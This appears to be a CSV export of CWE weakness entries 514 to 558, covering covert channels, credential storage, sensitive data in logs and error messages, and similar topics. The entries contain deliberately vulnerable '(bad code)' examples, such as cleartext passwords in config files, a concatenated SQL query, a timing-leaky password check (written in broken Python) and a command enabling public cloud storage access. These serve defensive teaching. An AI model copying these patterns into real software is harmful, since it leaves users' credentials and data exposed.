CWE-514: Covert Channel,A covert channel is a path that can be used to transfer information in a way not intended by the system's designers.,"Scope: ConfidentialityAccess Control, Impact: Technical Impact:Read Application Data; Bypass Protection Mechanism, Likelihood: ","Example 1In this example, the attacker observes how long an authentication takes when the user types in the correct password.When the attacker tries their own values, they can first try strings of various length. When they find a string of the right length, the computation will take a bit longer, because the for loop will run at least once. Additionally, with this code, the attacker can possibly learn one character of the password at a time, because when they guess the first character right, the computation will take longer than a wrong guesses. Such an attack can break even the most sophisticated password with a few hundred guesses.(bad code)Example Language:Pythondef validate_password(actual_pw, typed_pw):if len(actual_pw) <> len(typed_pw):return 0for i in len(actual_pw):if actual_pw[i] <> typed_pw[i]:return 0return 1Note that in this example, the actual password must be handled in constant time as far as the attacker is concerned, even if the actual password is of an unusual length. This is one reason why it is good to use an algorithm that, among other things, stores a seeded cryptographic one-way hash of the password, then compare the hashes, which will always be of the same length.",无可能的缓解方案
CWE-515: Covert Storage Channel,A covert storage channel transfers information through the setting of bits by one program and the reading of those bits by another. What distinguishes this case from that of ordinary operation is that the bits are used to convey encoded information.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataCovert storage channels may provide attackers with important information about the system in question., Likelihood: ; Scope: IntegrityConfidentiality, Impact: Technical Impact:Read Application DataIf these messages or packets are sent with unnecessary data contained within, it may tip off malicious listeners as to the process that created the message. With this information, attackers may learn any number of things, including the hardware platform, operating system, or algorithms used by the sender. This information can be of significant value to the user in launching further attacks., Likelihood: ","Example 1An excellent example of covert storage channels in a well known application is the ICMP error message echoing functionality. Due to ambiguities in the ICMP RFC, many IP implementations use the memory within the packet for storage or calculation. For this reason, certain fields of certain packets -- such as ICMP error packets which echo back parts of received messages -- may contain flaws or extra information which betrays information about the identity of the target operating system. This information is then used to build up evidence to decide the environment of the target. This is the first crucial step in determining if a given system is vulnerable to a particular flaw and what changes must be made to malicious code to mount a successful attack.",Phase:  ImplementationEnsure that all reserved fields are set to zero before messages are sent and that no unnecessary information is included.
CWE-516: DEPRECATED: Covert Timing Channel,This weakness can be found atCWE-385.,无常见后果信息,无示范例子,无可能的缓解方案
"CWE CATEGORY: DEPRECATED: Other Intentional, Nonmalicious Weakness","This category has been deprecated as it was originally used for organizing the Development View (CWE-699), but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: Inadvertently Introduced Weakness,"This category has been deprecated as it was originally used for organizing the Development View (CWE-699), but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: DEPRECATED: .NET Environment Issues,"This entry has been deprecated. It was originally used for organizing the Development View (CWE-699) and some other views, but it introduced unnecessary complexity and depth to the resulting tree.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-520: .NET Misconfiguration: Use of Impersonation,Allowing a .NET application to run at potentially escalated levels of access to the underlying operating and file systems can be dangerous and result in various forms of attacks.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ",无示范例子,Phase:  OperationRun the application with limited privilege to the underlying operating and file system.
CWE-521: Weak Password Requirements,"The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAn attacker could easily guess user passwords and gain access user accounts., Likelihood: ",无示范例子,"Phase:  Architecture and DesignA product's design should require adherance to an appropriate password policy. Specific password requirements depend strongly on contextual factors, but it is recommended to contain the following attributes:Enforcement of a minimum and maximum lengthRestrictions against password reuseRestrictions against using common passwordsRestrictions against using contextual string in the password (e.g., user id, app name)Depending on the threat model, the password policy may include several additional attributes.Complex passwords requiring mixed character sets (alpha, numeric, special, mixed case)Increasing the range of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication.Unfortunately, a complex password may be difficult to memorize, encouraging a user to select a short password or to incorrectly manage the password (write it down).Another disadvantage of this approach is that it often does not result in a significant increases in overal password complexity due to people's predictable usage of various symbols.Large Minimum Length (encouraging passphrases instead of passwords)Increasing the number of characters makes the password harder to crack and may be appropriate for systems relying on single factor authentication.A disadvantage of this approach is that selecting a good passphrase is not easy and poor passwords can still be generated. Some prompting may be needed to encourage long un-predictable passwords.Randomly Chosen SecretsGenerating a password for the user can help make sure that length and complexity requirements are met, and can result in secure passwords being used.A disadvantage of this approach is that the resulting password or passpharse may be too difficult to memorize, encouraging them to be written down.Password ExpirationRequiring a periodic password change can reduce the time window that an adversary has to crack a password, while also limiting the damage caused by password exposures at other locations.Password expiration may be a good mitigating technique when long complex passwords are not desired.See NIST 800-63B [REF-1053] for further information on password requirements.Phase:  Architecture and DesignConsider a second authentication factor beyond the password, which prevents the password from being a single point of failure. SeeCWE-308for further information.Phase:  ImplementationConsider implementing a password complexity meter to inform users when a chosen password meets the required attributes."
CWE-522: Insufficiently Protected Credentials,"The product transmits or stores authentication credentials, but it uses an insecure method that is susceptible to unauthorized interception and/or retrieval.","Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume IdentityAn attacker could gain access to user accounts and access sensitive data used by the user accounts., Likelihood: ","Example 1This code changes a user's password.(bad code)Example Language:PHP$user = $_GET['user'];$pass = $_GET['pass'];$checkpass = $_GET['checkpass'];if ($pass == $checkpass) {SetUserPassword($user, $pass);}While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.Example 2The following code reads a password from a properties file and uses the password to connect to a database.(bad code)Example Language:Java...Properties prop = new Properties();prop.load(new FileInputStream(""config.properties""));String password = prop.getProperty(""password"");DriverManager.getConnection(url, usr, password);...This code will run successfully, but anyone who has access to config.properties can read the value of password. If a devious employee has access to this information, they can use it to break into the system.Example 3The following code reads a password from the registry and uses the password to create a new network credential.(bad code)Example Language:Java...String password = regKey.GetValue(passKey).toString();NetworkCredential netCred = new NetworkCredential(username,password,domain);...This code will run successfully, but anyone who has access to the registry key used to store the password can read the value of password. If a devious employee has access to this information, they can use it to break into the systemExample 4Both of these examples verify a password by comparing it to a stored compressed version.(bad code)Example Language:Cint VerifyAdmin(char *password) {if (strcmp(compress(password), compressed_password)) {printf(""Incorrect Password!\n"");return(0);}printf(""Entering Diagnostic Mode...\n"");return(1);}(bad code)Example Language:Javaint VerifyAdmin(String password) {if (passwd.Equals(compress(password), compressed_password)) {return(0);}//Diagnostic Modereturn(1);}Because a compression algorithm is used instead of a one way hashing algorithm, an attacker can recover compressed passwords stored in the database.Example 5The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in cleartext.This Java example shows a properties file with a cleartext username / password pair.(bad code)Example Language:Java# Java Web App ResourceBundle properties file...webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in cleartext.(bad code)Example Language:ASP.NET...<connectionStrings><add name=""ud_DEV"" connectionString=""connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;"" providerName=""System.Data.Odbc"" /></connectionStrings>...Username and password information should not be included in a configuration file or a properties file in cleartext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.Example 6In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were ""insecure by design"" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.Multiple vendors used cleartext transmission or storage of passwords in their OT products.","Phase:  Architecture and DesignUse an appropriate security mechanism to protect the credentials.Phase:  Architecture and DesignMake appropriate use of cryptography to protect the credentials.Phase:  ImplementationUse industry standards to protect the credentials (e.g. LDAP, keystore, etc.)."
CWE-523: Unprotected Transport of Credentials,Login pages do not use adequate measures to protect the user name and password while they are in transit from the client to the server.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ",无示范例子,"Phases:  Operation; System ConfigurationEnforce SSL use for the login page or any page used to transmit user credentials or other sensitive information. Even if the entire site does not use SSL, it MUST use SSL for login. Additionally, to help prevent phishing attacks, make sure that SSL serves the login page. SSL allows the user to verify the identity of the server to which they are connecting. If the SSL serves login page, the user can be certain they are talking to the proper end system. A phishing attack would typically redirect a user to a site that does not have a valid trusted server certificate issued from an authorized supplier."
CWE-524: Use of Cache Containing Sensitive Information,"The code uses a cache that contains sensitive information, but the cache can be read by an actor outside of the intended control sphere.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,Phase:  Architecture and DesignProtect information stored in cache.Phase:  Architecture and DesignDo not store unnecessarily sensitive information in the cache.Phase:  Architecture and DesignConsider using encryption in the cache.
CWE-525: Use of Web Browser Cache Containing Sensitive Information,The web application does not use an appropriate caching policy that specifies the extent to which each web page and associated form fields should be cached.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataBrowsers often store information in a client-side cache, which can leave behind sensitive information for other users to find and exploit, such as passwords or credit card numbers. The locations at most risk include public terminals, such as those in libraries and Internet cafes., Likelihood: ",无示范例子,Phase:  Architecture and DesignProtect information stored in cache.Phases:  Architecture and Design; ImplementationUse a restrictive caching policy for forms and web pages that potentially contain sensitive information.Phase:  Architecture and DesignDo not store unnecessarily sensitive information in the cache.Phase:  Architecture and DesignConsider using encryption in the cache.
CWE-526: Cleartext Storage of Sensitive Information in an Environment Variable,The product uses an environment variable to store unencrypted sensitive information.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,"Phase:  Architecture and DesignEncrypt information stored in the environment variable to protect it from being exposed to an unauthorized user. If encryption is not feasible or is considered too expensive for the business use of the application, then consider using a properly protected configuration file instead of an environment variable. It should be understood that unencrypted information in a config file is also not guaranteed to be protected, but it is still a better choice, because it reduces attack surface related to weaknesses such asCWE-214. In some settings, vaults might be a feasible option for safer data transfer. Users should be notified of the business choice made to not protect the sensitive information through encryption.Phase:  ImplementationIf the environment variable is not necessary for the desired behavior, then remove it entirely, or clear it to an empty value."
CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere,"The product stores a CVS, git, or other repository in a directory, archive, or other resource that is stored, transferred, or otherwise made accessible to unauthorized actors.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read Files or Directories, Likelihood: ",无示范例子,"Phases:  Operation; Distribution; System ConfigurationRecommendations include removing any CVS directories and repositories from the production server, disabling the use of remote CVS repositories, and ensuring that the latest CVS patches and version updates have been performed."
CWE-528: Exposure of Core Dump File to an Unauthorized Control Sphere,"The product generates a core dump file in a directory, archive, or other resource that is stored, transferred, or otherwise made accessible to unauthorized actors.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data; Read Files or Directories, Likelihood: ",无示范例子,Phase:  System ConfigurationProtect the core dump files from unauthorized access.
CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere,The product stores access control list files in a directory or other container that is accessible to actors outside of the intended control sphere.,"Scope: ConfidentialityAccess Control, Impact: Technical Impact:Read Application Data; Bypass Protection Mechanism, Likelihood: ",无示范例子,Phase:  System ConfigurationProtect access control list files.
CWE-530: Exposure of Backup File to an Unauthorized Control Sphere,A backup file is stored in a directory or archive that is made accessible to unauthorized actors.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataAt a minimum, an attacker who retrieves this file would have all the information contained in it, whether that be database calls, the format of parameters accepted by the application, or simply information regarding the architectural structure of your site., Likelihood: ",无示范例子,Phase:  PolicyRecommendations include implementing a security policy within your organization that prohibits backing up web application source code in the webroot.
CWE-531: Inclusion of Sensitive Information in Test Code,"Accessible test applications can pose a variety of security risks. Since developers or administrators rarely consider that someone besides themselves would even know about the existence of these applications, it is common for them to contain sensitive information or functions.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1Examples of common issues with test applications include administrative functions, listings of usernames, passwords or session identifiers and information about the system, server or application configuration.",Phases:  Distribution; InstallationRemove test code before deploying the application into production.
CWE-532: Insertion of Sensitive Information into Log File,Information written to log files can be of a sensitive nature and give valuable guidance to an attacker or expose sensitive user information.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataLogging sensitive user data often provides attackers with an additional, less-protected path to acquiring the information., Likelihood: ","Example 1In the following code snippet, a user's full name and credit card number are written to a log file.(bad code)Example Language:Javalogger.info(""Username: "" + usernme + "", CCN: "" + ccn);Example 2This code stores location information about the current user:(bad code)Example Language:JavalocationClient = new LocationClient(this, this, this);locationClient.connect();currentUser.setLocation(locationClient.getLastLocation());...catch (Exception e) {AlertDialog.Builder builder = new AlertDialog.Builder(this);builder.setMessage(""Sorry, this application has experienced an error."");AlertDialog alert = builder.create();alert.show();Log.e(""ExampleActivity"", ""Caught exception: "" + e + "" While on User:"" + User.toString());}When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log.Example 3In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file.(bad code)Example Language:Javapublic BankAccount getUserBankAccount(String username, String accountNumber) {BankAccount userAccount = null;String query = null;try {if (isAuthorizedUser(username)) {query = ""SELECT * FROM accounts WHERE owner = ""+ username + "" AND accountID = "" + accountNumber;DatabaseManager dbManager = new DatabaseManager();Connection conn = dbManager.getConnection();Statement stmt = conn.createStatement();ResultSet queryResult = stmt.executeQuery(query);userAccount = (BankAccount)queryResult.getObject(accountNumber);}} catch (SQLException ex) {String logMessage = ""Unable to retrieve account information from database,\nquery: "" + query;Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);}return userAccount;}The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database.",Phases:  Architecture and Design; ImplementationConsider seriously the sensitivity of the information written into log files. Do not write secrets into the log files.Phase:  DistributionRemove debug log files before deploying the application into production.Phase:  OperationProtect log files against unauthorized read/write.Phase:  ImplementationAdjust configurations appropriately when software is transitioned from a debug state to production.
CWE-533: DEPRECATED: Information Exposure Through Server Log Files,This entry has been deprecated because its abstraction was too low-level. SeeCWE-532.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-534: DEPRECATED: Information Exposure Through Debug Log Files,This entry has been deprecated because its abstraction was too low-level. SeeCWE-532.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-535: Exposure of Information Through Shell Error Message,"A command shell error message indicates that there exists an unhandled exception in the web application code. In many cases, an attacker can leverage the conditions that cause these errors in order to gain unauthorized access to the system.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,无可能的缓解方案
CWE-536: Servlet Runtime Error Message Containing Sensitive Information,A servlet error message indicates that there exists an unhandled exception in your web application code and may provide useful information to an attacker.,"Scope: Confidentiality, Impact: Technical Impact:Read Application DataThe error message may contain the location of the file in which the offending function is located. This may disclose the web root's absolute path as well as give the attacker the location of application files or configuration information. It may even disclose the portion of code that failed. In many cases, an attacker can use the data to launch further attacks against the system., Likelihood: ","Example 1The following servlet code does not catch runtime exceptions, meaning that if such an exception were to occur, the container may display potentially dangerous information (such as a full stack trace).(bad code)Example Language:Javapublic void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {String username = request.getParameter(""username"");// May cause unchecked NullPointerException.if (username.length() < 10) {...}}",无可能的缓解方案
CWE-537: Java Runtime Error Message Containing Sensitive Information,"In many cases, an attacker can leverage the conditions that cause unhandled exception errors in order to gain unauthorized access to the system.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1In the following Java example the class InputFileRead enables an input file to be read using a FileReader object. In the constructor of this class a default input file path is set to some directory on the local file system and the method setInputFile must be called to set the name of the input file to be read in the default directory. The method readInputFile will create the FileReader object and will read the contents of the file. If the method setInputFile is not called prior to calling the method readInputFile then the File object will remain null when initializing the FileReader object. A Java RuntimeException will be raised, and an error message will be output to the user.(bad code)Example Language:Javapublic class InputFileRead {private File readFile = null;private FileReader reader = null;private String inputFilePath = null;private final String DEFAULT_FILE_PATH = ""c:\\somedirectory\\"";public InputFileRead() {inputFilePath = DEFAULT_FILE_PATH;}public void setInputFile(String inputFile) {/* Assume appropriate validation / encoding is used and privileges / permissions are preserved */}public void readInputFile() {try {reader = new FileReader(readFile);...} catch (RuntimeException rex) {System.err.println(""Error: Cannot open input file in the directory "" + inputFilePath);System.err.println(""Input file has not been set, call setInputFile method before calling readInputFile"");} catch (FileNotFoundException ex) {...}}}However, the error message output to the user contains information regarding the default directory on the local file system. This information can be exploited and may lead to unauthorized access or use of the system. Any Java RuntimeExceptions that are handled should not expose sensitive information to the user.Example 2In the example below, the BankManagerLoginServlet servlet class will process a login request to determine if a user is authorized to use the BankManager Web service. The doPost method will retrieve the username and password from the servlet request and will determine if the user is authorized. If the user is authorized the servlet will go to the successful login page. Otherwise, the servlet will raise a FailedLoginException and output the failed login message to the error page of the service.(bad code)Example Language:Javapublic class BankManagerLoginServlet extends HttpServlet {protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {try {// Get username and password from login page requestString username = request.getParameter(""username"");String password = request.getParameter(""password"");// Authenticate userBankManager bankMgr = new BankManager();boolean isAuthentic = bankMgr.authenticateUser(username, password);// If user is authenticated then go to successful login pageif (isAuthentic) {request.setAttribute(""login"", new String(""Login Successful.""));getServletContext().getRequestDispatcher(""/BankManagerServiceLoggedIn.jsp""). forward(request, response);}else {// Otherwise, raise failed login exception and output unsuccessful login message to error pagethrow new FailedLoginException(""Failed Login for user "" + username + "" with password "" + password);}} catch (FailedLoginException ex) {// output failed login message to error pagerequest.setAttribute(""error"", new String(""Login Error""));request.setAttribute(""message"", ex.getMessage());getServletContext().getRequestDispatcher(""/ErrorPage.jsp"").forward(request, response);}}However, the output message generated by the FailedLoginException includes the user-supplied password. Even if the password is erroneous, it is probably close to the correct password. Since it is printed to the user's page, anybody who can see the screen display will be able to see the password. Also, if the page is cached, the password might be written to disk.",Phase:  ImplementationDo not expose sensitive error information to the user.
CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory,"The product places sensitive information into files or directories that are accessible to actors who are allowed to have access to the files, but not to the sensitive information.","Scope: Confidentiality, Impact: Technical Impact:Read Files or Directories, Likelihood: ","Example 1In the following code snippet, a user's full name and credit card number are written to a log file.(bad code)Example Language:Javalogger.info(""Username: "" + usernme + "", CCN: "" + ccn);",Phases:  Architecture and Design; Operation; System ConfigurationDo not expose file and directory information to the user.
CWE-539: Use of Persistent Cookies Containing Sensitive Information,"The web application uses persistent cookies, but the cookies contain sensitive information.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,Phase:  Architecture and DesignDo not store sensitive information in persistent cookies.
CWE-540: Inclusion of Sensitive Information in Source Code,Source code on a web server or repository often contains sensitive information and should generally not be accessible to users.,"Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following code uses an include file to store database credentials:database.inc(bad code)Example Language:PHP<?php$dbName = 'usersDB';$dbPassword = 'skjdh#67nkjd3$3$';?>login.php(bad code)Example Language:PHP<?phpinclude('database.inc');$db = connectToDB($dbName, $dbPassword);$db.authenticateUser($username, $password);?>If the server does not have an explicit handler set for .inc files it may send the contents of database.inc to an attacker without pre-processing, if the attacker requests the file directly. This will expose the database name and password.Example 2The following comment, embedded in a JSP, will be displayed in the resulting HTML output.(bad code)Example Language:JSP<!-- FIXME: calling this with more than 30 args kills the JDBC server -->",Phases:  Architecture and Design; System ConfigurationRecommendations include removing this script from the web server and moving it to a location not accessible from the Internet.
CWE-541: Inclusion of Sensitive Information in an Include File,"If an include file source is accessible, the file can contain usernames and passwords, as well as sensitive information pertaining to the application and system.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ","Example 1The following code uses an include file to store database credentials:database.inc(bad code)Example Language:PHP<?php$dbName = 'usersDB';$dbPassword = 'skjdh#67nkjd3$3$';?>login.php(bad code)Example Language:PHP<?phpinclude('database.inc');$db = connectToDB($dbName, $dbPassword);$db.authenticateUser($username, $password);?>If the server does not have an explicit handler set for .inc files it may send the contents of database.inc to an attacker without pre-processing, if the attacker requests the file directly. This will expose the database name and password.",Phase:  Architecture and DesignDo not store sensitive information in include files.Phases:  Architecture and Design; System ConfigurationProtect include files from being exposed.
CWE-542: DEPRECATED: Information Exposure Through Cleanup Log Files,This entry has been deprecated because its abstraction was too low-level. SeeCWE-532.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-543: Use of Singleton Pattern Without Synchronization in a Multithreaded Context,The product uses the singleton pattern when creating a resource within a multithreaded environment.,"Scope: OtherIntegrity, Impact: Technical Impact:Other; Modify Application Data, Likelihood: ","Example 1This method is part of a singleton pattern, yet the following singleton() pattern is not thread-safe. It is possible that the method will create two objects instead of only one.(bad code)Example Language:Javaprivate static NumberConverter singleton;public static NumberConverter get_singleton() {if (singleton == null) {singleton = new NumberConverter();}return singleton;}Consider the following course of events:Thread A enters the method, finds singleton to be null, begins the NumberConverter constructor, and then is swapped out of execution.Thread B enters the method and finds that singleton remains null. This will happen if A was swapped out during the middle of the constructor, because the object reference is not set to point at the new object on the heap until the object is fully initialized.Thread B continues and constructs another NumberConverter object and returns it while exiting the method.Thread A continues, finishes constructing its NumberConverter object, and returns its version.At this point, the threads have created and returned two different objects.","Phase:  Architecture and DesignUse the Thread-Specific Storage Pattern. See References.Phase:  ImplementationDo not use member fields to store information in the Servlet. In multithreading environments, storing user data in Servlet member fields introduces a data access race condition.Phase:  ImplementationAvoid using the double-checked locking pattern in language versions that cannot guarantee thread safety. This pattern may be used to avoid the overhead of a synchronized call, but in certain versions of Java (for example), this has been shown to be unsafe because it still introduces a race condition (CWE-209).Effectiveness: Limited"
CWE-544: Missing Standardized Error Handling Mechanism,"The product does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses.","Scope: IntegrityOther, Impact: Technical Impact:Quality Degradation; Unexpected State; Varies by Context, Likelihood: ",无示范例子,"Phase:  Architecture and Designdefine a strategy for handling errors of different severities, such as fatal errors versus basic log events. Use or create built-in language features, or an external package, that provides an easy-to-use API and define coding standards for the detection and handling of errors."
CWE-545: DEPRECATED: Use of Dynamic Class Loading,"This weakness has been deprecated because it partially overlapsCWE-470, it describes legitimate programmer behavior, and other portions will need to be integrated into other entries.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-546: Suspicious Comment,"The code contains comments that suggest the presence of bugs, incomplete functionality, or weaknesses.","Scope: Other, Impact: Technical Impact:Quality DegradationSuspicious comments could be an indication that there are problems in the source code that may need to be fixed and is an indication of poor quality. This could lead to further bugs and the introduction of weaknesses., Likelihood: ",Example 1The following excerpt demonstrates the use of a suspicious comment in an incomplete code block that may have security repercussions.(bad code)Example Language:Javaif (user == null) {// TODO: Handle null user condition.},"Phase:  DocumentationRemove comments that suggest the presence of bugs, incomplete functionality, or weaknesses, before deploying the application."
"CWE-547: Use of Hard-coded, Security-relevant Constants","The product uses hard-coded constants instead of symbolic names for security-critical values, which increases the likelihood of mistakes during code maintenance or security policy change.","Scope: Other, Impact: Technical Impact:Varies by Context; Quality DegradationThe existence of hardcoded constants could cause unexpected behavior and the introduction of weaknesses during code maintenance or when making changes to the code if all occurrences are not modified. The use of hardcoded constants is an indication of poor quality., Likelihood: ","Example 1The usage of symbolic names instead of hard-coded constants is preferred.The following is an example of using a hard-coded constant instead of a symbolic name.(bad code)Example Language:Cchar buffer[1024];...fgets(buffer, 1024, stdin);If the buffer value needs to be changed, then it has to be altered in more than one place. If the developer forgets or does not find all occurrences, in this example it could lead to a buffer overflow.(good code)Example Language:Cenum { MAX_BUFFER_SIZE = 1024 };...char buffer[MAX_BUFFER_SIZE];...fgets(buffer, MAX_BUFFER_SIZE, stdin);In this example the developer will only need to change one value and all references to the buffer size are updated, as a symbolic name is used instead of a hard-coded constant.",Phase:  ImplementationAvoid using hard-coded constants. Configuration files offer a more flexible solution.
CWE-548: Exposure of Information Through Directory Listing,"A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.","Scope: Confidentiality, Impact: Technical Impact:Read Files or DirectoriesExposing the contents of a directory can lead to an attacker gaining access to source code or providing useful information for the attacker to devise exploits, such as creation times of files or any information that may be encoded in file names. The directory listing may also compromise private or confidential data., Likelihood: ",无示范例子,"Phases:  Architecture and Design; System ConfigurationRecommendations include restricting access to important directories or files by adopting a need to know requirement for both the document and server root, and turning off features such as Automatic Directory Listings that could expose private files and provide information that could be utilized by an attacker when formulating or conducting an attack."
CWE-549: Missing Password Field Masking,"The product does not mask passwords during entry, increasing the potential for attackers to observe and capture passwords.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,Phases:  Implementation; RequirementsRecommendations include requiring all password fields in your web application be masked to prevent other users from seeing this information.
CWE-550: Server-generated Error Message Containing Sensitive Information,"Certain conditions, such as network failure, will cause a server error message to be displayed.","Scope: Confidentiality, Impact: Technical Impact:Read Application Data, Likelihood: ",无示范例子,"Phases:  Architecture and Design; System ConfigurationRecommendations include designing and adding consistent error handling mechanisms which are capable of handling any user input to your web application, providing meaningful detail to end-users, and preventing error messages that might provide information useful to an attacker from being displayed."
CWE-551: Incorrect Behavior Order: Authorization Before Parsing and Canonicalization,"If a web server does not fully parse requested URLs before it examines them for authorization, it may be possible for an attacker to bypass authorization protection.","Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",无示范例子,Phase:  Architecture and DesignURL Inputs should be decoded and canonicalized to the application's current internal representation before being validated and processed for authorization. Make sure that your application does not decode the same input twice. Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked.
CWE-552: Files or Directories Accessible to External Parties,"The product makes files or directories accessible to unauthorized actors, even though they should not be.","Scope: ConfidentialityIntegrity, Impact: Technical Impact:Read Files or Directories; Modify Files or Directories, Likelihood: ","Example 1The following Azure command updates the settings for a storage account:(bad code)Example Language:Shellaz storage account update --name <storage-account> --resource-group <resource-group> --allow-blob-public-access trueHowever, ""Allow Blob Public Access"" is set to true, meaning that anonymous/public users can access blobs.The command could be modified to disable ""Allow Blob Public Access"" by setting it to false.(good code)Example Language:Shellaz storage account update --name <storage-account> --resource-group <resource-group> --allow-blob-public-access falseExample 2The following Google Cloud Storage command gets the settings for a storage account named 'BUCKET_NAME':(informative)Example Language:Shellgsutil iam get gs://BUCKET_NAMESuppose the command returns the following result:(bad code)Example Language:JSON{""bindings"":[{""members"":[""projectEditor: PROJECT-ID"",""projectOwner: PROJECT-ID""],""role"":""roles/storage.legacyBucketOwner""},{""members"":[""allUsers"",""projectViewer: PROJECT-ID""],""role"":""roles/storage.legacyBucketReader""}]}This result includes the ""allUsers"" or IAM role added as members, causing this policy configuration to allow public access to cloud storage resources. There would be a similar concern if ""allAuthenticatedUsers"" was present.The command could be modified to remove ""allUsers"" and/or ""allAuthenticatedUsers"" as follows:(good code)Example Language:Shellgsutil iam ch -d allUsers gs://BUCKET_NAMEgsutil iam ch -d allAuthenticatedUsers gs://BUCKET_NAME","Phases:  Implementation; System Configuration; OperationWhen storing data in the cloud (e.g., S3 buckets, Azure blobs, Google Cloud Storage, etc.), use the provider's controls to disable public access."
CWE-553: Command Shell in Externally Accessible Directory,A possible shell file exists in /cgi-bin/ or other accessible directories. This is extremely dangerous and can be used by an attacker to execute commands on the web server.,"Scope: ConfidentialityIntegrityAvailability, Impact: Technical Impact:Execute Unauthorized Code or Commands, Likelihood: ",无示范例子,Phases:  Installation; System ConfigurationRemove any Shells accessible under the web root folder and children directories.
CWE-554: ASP.NET Misconfiguration: Not Using Input Validation Framework,The ASP.NET application does not use an input validation framework.,"Scope: Integrity, Impact: Technical Impact:Unexpected StateUnchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others., Likelihood: ",无示范例子,"Phase:  Architecture and DesignUse the ASP.NET validation framework to check all program input before it is processed by the application. Example uses of the validation framework include checking to ensure that:Phone number fields contain only valid characters in phone numbersBoolean values are only ""T"" or ""F""Free-form strings are of a reasonable length and composition"
CWE-555: J2EE Misconfiguration: Plaintext Password in Configuration File,The J2EE application stores a plaintext password in a configuration file.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection Mechanism, Likelihood: ",Example 1Below is a snippet from a Java properties file in which the LDAP server password is stored in plaintext.(bad code)Example Language:Javawebapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword,Phase:  Architecture and DesignDo not hardwire passwords into your software.Phase:  Architecture and DesignUse industry standard libraries to encrypt passwords before storage in configuration files.
CWE-556: ASP.NET Misconfiguration: Use of Identity Impersonation,Configuring an ASP.NET application to run with impersonated credentials may give the application unnecessary privileges.,"Scope: Access Control, Impact: Technical Impact:Gain Privileges or Assume Identity, Likelihood: ",无示范例子,Phase:  Architecture and DesignUse the least privilege principle.
CWE CATEGORY: Concurrency Issues,Weaknesses in this category are related to concurrent use of shared resources.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-558: Use of getlogin() in Multithreaded Application,"The product uses the getlogin() function in a multithreaded context, potentially causing it to return incorrect values.","Scope: IntegrityAccess ControlOther, Impact: Technical Impact:Modify Application Data; Bypass Protection Mechanism; Other, Likelihood: ",Example 1The following code relies on getlogin() to determine whether or not a user is trusted. It is easily subverted.(bad code)Example Language:Cpwd = getpwnam(getlogin());if (isTrustedGroup(pwd->pw_gid)) {allow();} else {deny();},"Phase:  Architecture and DesignUsing names for security purposes is not advised. Names are easy to forge and can have overlapping user IDs, potentially causing confusion or impersonation.Phase:  ImplementationUse getlogin_r() instead, which is reentrant, meaning that other processes are locked out from changing the username."
